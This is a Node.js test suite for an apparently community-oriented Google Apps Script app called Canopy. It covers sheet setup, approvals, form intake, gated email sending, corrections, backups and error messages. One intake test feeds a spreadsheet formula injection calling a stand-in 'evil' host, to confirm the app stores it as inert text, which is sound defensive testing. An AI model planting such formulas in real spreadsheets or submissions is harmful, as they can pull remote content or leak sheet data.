/* Runs the generated Apps Script bundle against mocked Google services. */
const test = require('node:test');
const assert = require('node:assert/strict');
const { makeEnv } = require('./gas-mocks');

function post(env, body) {
  return JSON.parse(env.g.doPost({ postData: { contents: JSON.stringify(body) } }).text);
}
function get(env, params) {
  return env.g.doGet({ parameter: params });
}

test('setup creates every tab with headers and seeds drafts only', () => {
  const env = makeEnv();
  env.g.canopySetup();
  const names = Object.keys(env.sheets);
  ['Settings', 'Roles', 'Meetings', 'Recaps', 'Events', 'Groups', 'Memberships', 'Notifications', 'Submissions', 'Verification', 'Audit'].forEach((t) => assert.ok(names.includes(t), t));
  assert.equal(env.sheets.Meetings.cells[0][0], 'id');
  assert.equal(env.sheets.Meetings.cells.length, 1 + 14);
  const snap = JSON.parse(get(env, { action: 'public' }).text);
  assert.equal(snap.meetings.length, 0);
  // running setup twice does not duplicate seed rows
  env.g.canopySetup();
  assert.equal(env.sheets.Meetings.cells.length, 1 + 14);
});

test('menu approve publishes, stamps the steward, and refreshes the cached public data', () => {
  const env = makeEnv();
  env.g.canopySetup();
  assert.equal(JSON.parse(get(env, { action: 'public' }).text).meetings.length, 0); // now cached
  env.select('Meetings', env.rowOf('Meetings', 'mtg-2026-12-12'));
  env.g.canopyMenuApprove();
  assert.match(env.alerts.pop(), /Approved: 1 row/);
  const snap = JSON.parse(get(env, { action: 'public' }).text);
  assert.equal(snap.meetings.length, 1);
  const header = env.sheets.Meetings.cells[0];
  const row = env.sheets.Meetings.cells[env.rowOf('Meetings', 'mtg-2026-12-12') - 1];
  assert.equal(row[header.indexOf('approved_by')], 'steward.one@example.org');
});

test('web app intake end-to-end: saved to sheets, simulated email, private fields stay private', () => {
  const env = makeEnv();
  env.g.canopySetup();
  env.g.canopyLoadDemo();
  const res = post(env, { action: 'submit', type: 'interest', client_id: 'x1', name: 'Robin', email: 'robin.private@example.org', group_id: 'grp-01', participation: 'independent', consent_share_with_contact: 'yes', note: '=IMPORTXML("http://evil","//a")' });
  assert.equal(res.ok, true);
  assert.equal(res.status, 'routed');
  assert.equal(env.sent.length, 0, 'LIVE_SENDING is off');
  const notes = env.sheets.Memberships.cells.map((r) => r[env.sheets.Memberships.cells[0].indexOf('note')]);
  assert.ok(notes.includes('=IMPORTXML("http://evil","//a")'), 'stored as literal text, not a formula');
  assert.ok(!JSON.stringify(env.sheets).includes('#FORMULA'));
  const pub = get(env, { action: 'public' }).text;
  assert.ok(!pub.includes('robin.private@example.org'));
  const ics = get(env, { action: 'ics' });
  assert.equal(ics.mime, 'ical');
  assert.match(ics.text, /BEGIN:VCALENDAR/);
  // Replay is idempotent through the web app too.
  const again = post(env, { action: 'submit', type: 'interest', client_id: 'x1', name: 'Robin', email: 'robin.private@example.org', group_id: 'grp-01', consent_share_with_contact: 'yes' });
  assert.equal(again.reference, res.reference);
});

test('live sending through MailApp with a test recipient', () => {
  const env = makeEnv();
  env.g.canopySetup();
  env.g.canopyLoadDemo();
  const store = new env.g.SheetStore();
  env.g.Canopy.setSetting(store, 'LIVE_SENDING', 'yes');
  env.g.Canopy.setSetting(store, 'TEST_RECIPIENT', 'tester@example.org');
  post(env, { action: 'submit', type: 'event', title: 'Swap', organizer: 'X', date: '2027-01-16', start_time: '10:00', venue: 'Hall', city: 'DeKalb', county: 'DeKalb', relevance: 'Reuse', submitter_name: 'Z', submitter_email: 'z@example.org' });
  assert.equal(env.sent.length, 2);
  assert.ok(env.sent.every((m) => m.to === 'tester@example.org' && m.name === 'Canopy'));
});

test('correction menu applies to the referenced record; backups write private + public files', () => {
  const env = makeEnv();
  env.g.canopySetup();
  env.g.canopyLoadDemo();
  const store = new env.g.SheetStore();
  const cor = store.insert('Corrections', { id: 'cor-1', record_ref: 'Events:evt-demo-1', description: 'Room change', proposed_changes: JSON.stringify({ venue: 'Room 2' }), state: 'open' });
  env.select('Corrections', env.rowOf('Corrections', cor.id));
  env.g.canopyMenuApplyCorrection();
  assert.match(env.alerts.pop(), /Applied/);
  assert.equal(new env.g.SheetStore().get('Events', 'evt-demo-1').venue, 'Room 2');
  env.g.canopyMenuBackup();
  assert.equal(env.files.length, 2);
  const backup = JSON.parse(env.files.find((f) => /backup/.test(f.name)).body);
  assert.ok(backup.tables.People.length >= 1);
  const pub = env.files.find((f) => /public/.test(f.name)).body;
  assert.ok(!pub.includes('sam.private@example.org'));
});

test('triggers install idempotently', () => {
  const env = makeEnv();
  env.g.canopySetup();
  env.g.canopyInstallTriggers();
  env.g.canopyInstallTriggers();
  assert.equal(env.triggers.length, 3);
});

test('broken requests return a safe message, never a stack trace', () => {
  const env = makeEnv();
  env.g.canopySetup();
  const r = JSON.parse(env.g.doPost({ postData: { contents: '{not json' } }).text);
  assert.equal(r.ok, false);
  assert.equal(r.message, 'Invalid request.');
});
